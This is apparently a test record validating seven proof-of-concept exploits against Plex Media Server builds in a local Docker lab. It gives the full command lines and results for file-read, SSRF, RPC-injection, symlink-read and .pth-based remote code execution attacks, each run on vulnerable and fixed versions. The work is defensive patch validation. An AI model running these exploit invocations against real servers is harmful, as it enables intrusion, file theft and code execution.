# Test Record

## Environment

- Test date: 2026-09-10
- Host architecture: x86-64
- Server platform: Linux Docker
- Python: `3.12.3`
- Docker: `29.1.3`
- 10828 amd64 image: `plexinc/pms-docker@sha256:f6748983db1054b571b57b4a40f07f53af6c4bfb9edd1fa455f5ebb6e16449bc`
- 10861 amd64 image: `plexinc/pms-docker@sha256:dd9bcf6494a1f7e817710e75d2ff66beb68485b5ea1b63c7c712adc25983b9bb`
- 10896 amd64 image: `plexinc/pms-docker@sha256:c708587e4874617961a1bc24db9cffa2413653ff422f1b05dfec013339e6824d`
- 10903 lab image: locally built from the official Linux amd64 DEB listed below
- Servers: `1.43.3.10828-00f62d37d`, `1.43.3.10861-07dfddaeb`,
  `1.43.3.10896-cb3ebc72d`, and `1.43.4.10903-e5521bd8c`
- Authentication: generated `.LocalAdminToken` from each unclaimed lab server
- Network exposure: Docker port published on `127.0.0.1` only

The server configurations contained synthetic media and no user data.

## Results

| PoC | `1.43.3.10861-07dfddaeb` | `1.43.3.10896-cb3ebc72d` |
|---|---|---|
| `metadata-file-read/poc.py --file /etc/hostname` | HTTP 200, 13 bytes matched the container hostname | HTTP 400, target content not returned |
| `profile-extra-rce/poc.py --command 'touch /config/PROFILE_RCE_REPO_TEST'` | Per-run `.pth` created, container restarted, marker created | Profile setting ignored and per-run `.pth` not created |

Additional patch-boundary results:

| PoC | Vulnerable result | Fixed result |
|---|---|---|
| `network-transcoder-preference/poc.py` | 10828: both protected names accepted and persisted test values | 10861: both names returned HTTP 403 and remained empty |
| `companion-proxy-ssrf/poc.py` | 10828: callback received at injected authority and path | 10861: subscription HTTP 400 and no callback |
| `framework-rpc-injection/poc.py` | 10828: tagged-file JSON returned | 10861: `Agent not found` |
| `legacy-pth-rce/poc.py` | 10828: `.pth` written and marker executed after restart | 10861: preference HTTP 403 and no marker |
| `agentservice-symlink-read/poc.py` | 10896: HTTP 200 and exact target bytes | 10903: HTTP 404 and no target bytes |

All seven Python PoCs were executed against their documented vulnerable and
fixed boundaries during final validation on 2026-09-10. All scripts were also
compiled with `python3 -m py_compile`, and every command-line parser was invoked
with `--help`.

The RCE test's executable `.pth` and marker were removed after verification.
The revised PoC removes its per-run `.pth`, x264 companion file, and HLS
bootstrap files on both successful and failed verification unless
`--keep-payload` is specified.

## Commands and exit status

Tokens are replaced with `TOKEN` below. The test rating key was `1`.

```bash
python3 metadata-file-read/poc.py \
  --url http://127.0.0.1:34161 --rating-key 1 \
  --token TOKEN --file /etc/hostname
# exit 0; stderr: HTTP 200: received 13 bytes

python3 profile-extra-rce/poc.py \
  --url http://127.0.0.1:34161 --rating-key 1 \
  --token TOKEN --command 'touch /config/PROFILE_RCE_REPO_TEST_3' \
  --container plex-file-read-fixed \
  --verify-path /config/PROFILE_RCE_REPO_TEST_3
# exit 0; payload verified, container restarted, marker verified

python3 metadata-file-read/poc.py \
  --url http://127.0.0.1:54260 --rating-key 1 \
  --token TOKEN --file /etc/hostname
# exit 1; HTTP 400; no target content

python3 profile-extra-rce/poc.py \
  --url http://127.0.0.1:54260 --rating-key 1 \
  --token TOKEN --command 'touch /config/PROFILE_RCE_FIXED_TEST_2' \
  --container plex-repo-fixed-10896 \
  --verify-path /config/PROFILE_RCE_FIXED_TEST_2
# exit 1; error: payload was not written to the per-run .pth path
```

The additional boundary tests used 10828 on port 34128, 10861 on port 34161,
and temporary 10896 and 10903 servers on ports 50366 and 50382. The legacy chain
used a separate fresh 10828 configuration on port 34129 because its first stage
creates persistent Framework state:

```bash
python3 network-transcoder-preference/poc.py \
  --url http://127.0.0.1:34128 --value ref=3 --expect vulnerable
# exit 0; HTTP 200, ref=3 persisted, prior value restored

python3 network-transcoder-preference/poc.py \
  --url http://127.0.0.1:34161 --value ref=3 --expect fixed
# exit 0; HTTP 403, prior empty value preserved

python3 companion-proxy-ssrf/poc.py \
  --url http://127.0.0.1:34128 --callback-host host.docker.internal \
  --listen-port 33005 --expect vulnerable
# exit 0; timeline POST received on the per-run injected path

python3 companion-proxy-ssrf/poc.py \
  --url http://127.0.0.1:34161 --callback-host host.docker.internal \
  --listen-port 33005 --expect fixed
# exit 0; subscription HTTP 400, no callback

python3 framework-rpc-injection/poc.py \
  --url http://127.0.0.1:34128 --file /tmp/rpc-secret.mp3 \
  --marker PLEX_RPC_PYTHON_91A7 --expect vulnerable
# exit 0; tagged-file JSON contained the marker

python3 framework-rpc-injection/poc.py \
  --url http://127.0.0.1:34161 --file /tmp/rpc-secret.mp3 --expect fixed
# exit 0; Agent not found

python3 legacy-pth-rce/poc.py \
  --url http://127.0.0.1:34129 --rating-key 3 \
  --command 'touch /config/LEGACY_RCE_FINAL2' \
  --container plex-legacy-final2 --verify-path /config/LEGACY_RCE_FINAL2 \
  --expect vulnerable
# exit 0; clean directory created, .pth placed, command verified, payload removed

python3 legacy-pth-rce/poc.py \
  --url http://127.0.0.1:34161 --rating-key 1 \
  --command 'touch /config/LEGACY_RCE_FIXED_MARKER' \
  --container plex-file-read-fixed \
  --verify-path /config/LEGACY_RCE_FIXED_MARKER --expect fixed
# exit 0; protected preference returned HTTP 403 and no marker was created

python3 agentservice-symlink-read/poc.py \
  --url http://127.0.0.1:50366 --token TOKEN \
  --container plex-agent-final-10896 --target /etc/hostname --expect vulnerable
# exit 0; HTTP 200, 13 response bytes matched the target

python3 agentservice-symlink-read/poc.py \
  --url http://127.0.0.1:50382 --token TOKEN \
  --container plex-agent-final-10903 --target /etc/hostname --expect fixed
# exit 0; HTTP 404, zero response bytes
```

The tagged MP3 was generated with `ffmpeg`, copied to both RPC test containers,
and removed after testing. The AgentService bundles, legacy-chain payloads,
markers, temporary containers, and temporary configuration directories were
removed after verification.

## Fixed-build evidence

The fixed server logs the following message when the RCE profile augmentation
is supplied:

```text
ClientProfileExtra: ignoring transcode target setting VideoEncodeFlags, which may not be set from a profile augmentation
```

The fixed PMS binary also contains these metadata-reference validation strings:

```text
[Library] Rejecting metadata file request for unsupported media reference: %s
[Library] Rejecting metadata file request that escapes the bundle directory: %s
[Library] Ignoring media reference that escapes its bundle directory: %s
```

## Package hashes used during patch review

| Platform | Build | SHA-256 |
|---|---|---|
| Linux amd64 DEB | `1.43.3.10861-07dfddaeb` | `b3c3a910b4cb7dd8a77184196b0a7beabb19c790105cc47af9a9601ff12fd332` |
| Linux amd64 DEB | `1.43.3.10896-cb3ebc72d` | `aa09f266ddcf408e10cf7ba561b6e454e6e109ba9416396b6965bd4c79f37149` |
| Linux amd64 DEB | `1.43.3.10828-00f62d37d` | `89e534b590df3b450263ab71188ec64078b29a787337278e0c1921877c4eccd8` |
| Linux amd64 DEB | `1.43.4.10903-e5521bd8c` | `6f6a1c8336d779e1f20151a6934349884bad6f6a66b18a2b189b96e55c3b3edb` |
| Windows x86-64 | `1.43.3.10861-07dfddaeb` | `7c72b032c3a154b46bb4e2f2df8407b2aa55a2c457a04da334103921a9c3b45c` |
| Windows x86-64 | `1.43.3.10896-cb3ebc72d` | `92f1d6277b9cde5ad6c9b059e679276bca581d62a1299c9f77b15e541a70e3f3` |
| macOS universal | `1.43.3.10861-07dfddaeb` | `bf6b1466dbef552457b49be68e54020198987ea498622ec7cf95ae8252b243ee` |
| macOS universal | `1.43.3.10896-cb3ebc72d` | `185963b4043898a734db7b3d2b2845bc389492681544989550744edccb1a0e7b` |

## Sources

- [Plex security update announcement](https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319)
- [Official Plex downloads](https://www.plex.tv/media-server-downloads/)
